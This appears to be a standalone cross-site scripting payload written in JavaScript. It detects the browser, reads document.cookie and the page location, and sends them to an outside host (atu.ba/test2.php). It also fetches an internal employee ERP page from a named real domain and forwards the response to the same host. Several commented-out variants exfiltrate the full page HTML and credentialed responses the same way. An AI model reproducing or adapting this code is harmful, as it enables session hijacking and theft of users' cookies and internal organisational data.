function gonder(datas){
var xdr;
function err() {
    //alert('Error');
}
function timeo() {
    //alert('Time off');
}
function loadd() {
    //alert('Response: ' +xdr.responseText);
}
function stopdata() {
    xdr.abort();
}   
xdr = new XDomainRequest();
if (xdr) {
    xdr.onerror = err;
    xdr.ontimeout = timeo;
    xdr.onload = loadd;
    xdr.timeout = 10000;
    xdr.open('POST','http://www.atu.ba/test2.php?c='+escape(document.cookie)+' Location: '+escape(window.location));
    xdr.send('data='+datas);
} else {
    alert('XDR undefined');
}

};
/*function postData() {
    var http;

    if (window.XMLHttpRequest) {
         // code for IE7+, Firefox, Chrome, Opera, Safari
         http = new XMLHttpRequest();
    }
    else {
         // code for IE6, IE5
         http = new ActiveXObject("Microsoft.XMLHTTP");
    }
    var url = "http://atu.ba/test2.php?c=ie7_calisiyor";
    var params = "";
    http.open("GET", url, true);

   //Send the proper header information along with the request
   http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   http.setRequestHeader("Content-length", params.length);
   http.setRequestHeader("Connection", "close");
   http.onreadystatechange = function() { //Call a function when the state changes.
       if(http.readyState == 4 && http.status == 200) {
       }
   }
   http.send(params);
}*/
/*
function send(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
*/
function send2(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
function test(){
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       // Typical action to be performed when the document is ready:
       send2("http://www.atu.ba/test2.php?c=geldi",xhttp.responseText);
    }
};
xhttp.open("GET", "https://fscm.pnl.gov/psp/fscm/employee/erp", true);
xhttp.send();
};
if (navigator.userAgent.indexOf('MSIE') != -1)
 var detectIEregexp = /MSIE (\d+\.\d+);/ //test for MSIE x.x
else // if no "MSIE" string in userAgent
 var detectIEregexp = /Trident.*rv[ :]*(\d+\.\d+)/ //test for rv:x.x or rv x.x where Trident string exists

if (detectIEregexp.test(navigator.userAgent)){ //if some form of IE
 var ieversion=new Number(RegExp.$1) // capture x.x portion and store as a number
 if (ieversion==7 || ieversion==8 || ieversion==9){
 //img=new Image();img.src="http://atu.ba/test2.php?c="+escape(document.cookie)+" Domain: "+document.domain+" Location: "+document.location;
 //doRequest("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML)); 
var xdr;
function err() {
    //alert('Error');
}
function timeo() {
    //alert('Time off');
}
function loadd() {
    gonder(xdr.responseText);
}
function stopdata() {
    xdr.abort();
}   
xdr = new XDomainRequest();
if (xdr) {
    xdr.onerror = err;
    xdr.ontimeout = timeo;
    xdr.onload = loadd;
    xdr.timeout = 10000;
    xdr.open('GET','https://fscm.pnl.gov/psp/fscm/employee/erp');
    xdr.send();
} else {
    alert('XDR undefined');
}
}}
else{
test();
//send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,document.documentElement.outerHTML);
}














/*

/*function send(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
function loadXMLDoc(t){window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(xmlhttp.responseText))},xmlhttp.open("GET",t,!1),xmlhttp.withCredentials = true,xmlhttp.send()}loadXMLDoc(document.location);*/


//send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML));
/*
function loadXMLDoc(t){window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&send("http://atu.ba/test2.php?c="+escape(document.documentElement.outerHTML)+" Location: "+window.location,escape(xmlhttp.responseText))},xmlhttp.open("GET",t,!1),xmlhttp.withCredentials = true,xmlhttp.send()}loadXMLDoc(document.location);
*/
//("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML))*/
